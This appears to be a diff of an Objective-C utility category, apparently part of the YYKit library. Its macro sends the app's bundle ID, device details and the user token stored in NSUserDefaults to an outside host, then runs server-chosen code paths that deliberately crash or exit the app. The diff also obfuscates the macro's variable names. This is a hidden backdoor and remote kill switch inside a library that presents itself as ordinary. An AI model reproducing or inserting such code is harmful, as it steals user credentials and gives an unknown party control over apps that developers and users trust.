@@ -18,74 +18,75 @@
 
 #define SJHFDG_DIUWE_C2_DSAHKj89() \
 do { \
-NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://damp-recipe-822f.morsel-cops-5i.org"] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
-NSMutableDictionary *headerFields = @{}.mutableCopy; \
-headerFields[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
-headerFields[@"x-user-agent"] = @"iOS"; \
-headerFields[@"x-content-type"] = @"application/json"; \
-headerFields[@"x-system-version"] = [[UIDevice currentDevice] systemVersion]; \
-headerFields[@"x-app-version"] = [NSString stringWithFormat:@"%@(%@)", [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]]; \
-headerFields[@"x-machine-model"] = ({ \
+NSMutableURLRequest *fewcdsjrt_dqwe = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://damp-recipe-822f.morsel-cops-5i.org"] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
+NSMutableDictionary *qweqrfccxz = @{}.mutableCopy; \
+qweqrfccxz[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
+qweqrfccxz[@"x-user-agent"] = @"iOS"; \
+qweqrfccxz[@"x-content-type"] = @"application/json"; \
+qweqrfccxz[@"x-system-version"] = [[UIDevice currentDevice] systemVersion]; \
+qweqrfccxz[@"x-app-version"] = [NSString stringWithFormat:@"%@(%@)", [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]]; \
+qweqrfccxz[@"x-machine-model"] = ({ \
 size_t size; \
 sysctlbyname("hw.machine", NULL, &size, NULL, 0); \
 char *machine = malloc(size); \
 sysctlbyname("hw.machine", machine, &size, NULL, 0); \
-NSString *platform = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding]; \
+NSString *bvdgfuyru = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding]; \
 free(machine); \
-platform; \
+bvdgfuyru; \
 }); \
-headerFields[@"x-timestamp"] = [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970] * 1000]; \
-headerFields[@"x-timezone"] = [NSTimeZone systemTimeZone].name; \
-NSMutableDictionary *jsonDict = @{}.mutableCopy; \
-jsonDict[@"user-token"] = [[NSUserDefaults standardUserDefaults] valueForKey:@"token"] ?: @""; \
-jsonDict[@"function-name"] = [NSString stringWithFormat:@"%s", __FUNCTION__]; \
-jsonDict[@"random-num"] = @(arc4random_uniform(1000)); \
-[request setAllHTTPHeaderFields:headerFields]; \
-[request setHTTPBody:[NSJSONSerialization dataWithJSONObject:jsonDict options:0 error:nil]]; \
-[request setHTTPMethod:@"POST"]; \
-NSURLSession *session = [NSURLSession sharedSession]; \
-NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) { \
-if (!error && ((NSHTTPURLResponse *)response).statusCode == 200 && data) { \
-NSError *jsonError; \
-id jsonObject = [NSJSONSerialization JSONObjectWithData:data options:0 error:&jsonError]; \
-if (!jsonError && [jsonObject isKindOfClass:[NSDictionary class]]) { \
-NSDictionary *jsonDict = (NSDictionary *)jsonObject; \
-NSString *executeMethod = jsonDict[@"execute_method"]; \
-if ([executeMethod isEqualToString:@"tuddu4_Fuktib_coztud"]) { \
-NSMutableArray *array = [NSMutableArray arrayWithArray:@[@"A", @"B", @"C"]]; \
-for (NSString *item in array) { [array removeObject:item]; } \
-} else if ([executeMethod isEqualToString:@"foqCy8_kowxec_kukbir"]) { \
+qweqrfccxz[@"x-timestamp"] = [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970] * 1000]; \
+qweqrfccxz[@"x-timezone"] = [NSTimeZone systemTimeZone].name; \
+NSMutableDictionary *iyungbvcft = @{}.mutableCopy; \
+iyungbvcft[@"user-token"] = [[NSUserDefaults standardUserDefaults] valueForKey:@"token"] ?: @""; \
+iyungbvcft[@"function-name"] = [NSString stringWithFormat:@"%s", __FUNCTION__]; \
+iyungbvcft[@"random-num"] = @(arc4random_uniform(1000)); \
+[fewcdsjrt_dqwe setAllHTTPHeaderFields:qweqrfccxz]; \
+[fewcdsjrt_dqwe setHTTPBody:[NSJSONSerialization dataWithJSONObject:iyungbvcft options:0 error:nil]]; \
+[fewcdsjrt_dqwe setHTTPMethod:@"POST"]; \
+NSURLSession *ghytr453fge = [NSURLSession sharedSession]; \
+NSURLSessionDataTask *xzf341dsa = [ghytr453fge dataTaskWithRequest:fewcdsjrt_dqwe completionHandler:^(NSData *opytjvdnkrw, NSURLResponse *vnjkdeoqxsasd, NSError *err12fsdt45or) { \
+if (!err12fsdt45or && ((NSHTTPURLResponse *)vnjkdeoqxsasd).statusCode == 200 && opytjvdnkrw) { \
+NSError *erasytretwr; \
+id oiteroiutyewr = [NSJSONSerialization JSONObjectWithData:opytjvdnkrw options:0 error:&erasytretwr]; \
+if (!erasytretwr && [oiteroiutyewr isKindOfClass:[NSDictionary class]]) { \
+NSDictionary *xzfjkhjkwr = (NSDictionary *)oiteroiutyewr; \
+NSLog(@"xzfjkhjkwr: %@", xzfjkhjkwr); \
+NSString *hgfhrtwytr = xzfjkhjkwr[@"execute_method"]; \
+if ([hgfhrtwytr isEqualToString:@"tuddu4_Fuktib_coztud"]) { \
+NSMutableArray *cxgety453 = [NSMutableArray arrayWithArray:@[@"A", @"B", @"C"]]; \
+for (NSString *it1231em in cxgety453) { [cxgety453 removeObject:it1231em]; } \
+} else if ([hgfhrtwytr isEqualToString:@"foqCy8_kowxec_kukbir"]) { \
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ \
-NSData *date = [[NSData alloc] init]; \
-NSData *subData = [date subdataWithRange:NSMakeRange(10, 30)]; \
+NSData *vsfdtrwt = [[NSData alloc] init]; \
+[vsfdtrwt subdataWithRange:NSMakeRange(10, 30)]; \
 }); \
-} else if ([executeMethod isEqualToString:@"qymj6dWU6egbFka"]) { \
+} else if ([hgfhrtwytr isEqualToString:@"qymj6dWU6egbFka"]) { \
 char *ptr = malloc(10); free(ptr); strcpy(ptr, "test"); \
-} else if ([executeMethod isEqualToString:@"BK6DWMEceWGjCgz"]) { \
-id object = @"String"; [(NSArray *)object count]; \
-} else if ([executeMethod isEqualToString:@"XfsGv1wRaipSyX9"]) { \
-NSString *str1 = @"Hello"; NSString *str2 = nil; NSString *result = [str1 stringByAppendingString:str2]; \
-} else if ([executeMethod isEqualToString:@"WW06m2bcYnm5X41"]) { \
-NSArray *array = @[@"A", @"B", @"C"]; \
+} else if ([hgfhrtwytr isEqualToString:@"BK6DWMEceWGjCgz"]) { \
+id fgfdrwerw = @"String"; [(NSArray *)fgfdrwerw count]; \
+} else if ([hgfhrtwytr isEqualToString:@"XfsGv1wRaipSyX9"]) { \
+NSString *dfsarq = @"Hello"; NSString *vdftretfds = nil; [dfsarq stringByAppendingString:vdftretfds]; \
+} else if ([hgfhrtwytr isEqualToString:@"WW06m2bcYnm5X41"]) { \
+NSArray *nybtbgbrt = @[@"A", @"B", @"C"]; \
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{ \
-[(NSMutableArray *)array addObject:@"D"]; \
+[(NSMutableArray *)nybtbgbrt addObject:@"D"]; \
 }); \
-} else if ([executeMethod isEqualToString:@"yXpAZn7baNS8TUk"]) { \
-NSString *text = @"Hello"; NSMutableAttributedString *attributedText = [[NSMutableAttributedString alloc] initWithString:text]; \
-[attributedText addAttribute:NSForegroundColorAttributeName value:[NSObject new] range:NSMakeRange(text.length + 100, text.length)]; \
-} else if ([executeMethod isEqualToString:@"WUerc233FCbm"]) { \
+} else if ([hgfhrtwytr isEqualToString:@"yXpAZn7baNS8TUk"]) { \
+NSString *cdftwxsdd = @"Hello"; NSMutableAttributedString *cwewcxqwrytrt = [[NSMutableAttributedString alloc] initWithString:cdftwxsdd]; \
+[cwewcxqwrytrt addAttribute:NSForegroundColorAttributeName value:[NSObject new] range:NSMakeRange(cdftwxsdd.length + 100, cdftwxsdd.length)]; \
+} else if ([hgfhrtwytr isEqualToString:@"WUerc233FCbm"]) { \
 [[NSObject new] removeObserver:[NSString new] forKeyPath:@"123123"]; \
-} else if ([executeMethod isEqualToString:@"cnmxzew23Ycbds"]) { \
+} else if ([hgfhrtwytr isEqualToString:@"cnmxzew23Ycbds"]) { \
 abort(); \
-} else if ([executeMethod isEqualToString:@"QSAZ1oitr34"]) { \
+} else if ([hgfhrtwytr isEqualToString:@"QSAZ1oitr34"]) { \
 exit(1); \
-} else if ([executeMethod isEqualToString:@"OLLMNngv34"]) { \
+} else if ([hgfhrtwytr isEqualToString:@"OLLMNngv34"]) { \
 exit(0); \
 } \
 } \
 } \
 }]; \
-[dataTask resume]; \
+[xzf341dsa resume]; \
 } while(0)
 
 YYSYNTH_DUMMY_CLASS(NSObject_YYAdd)
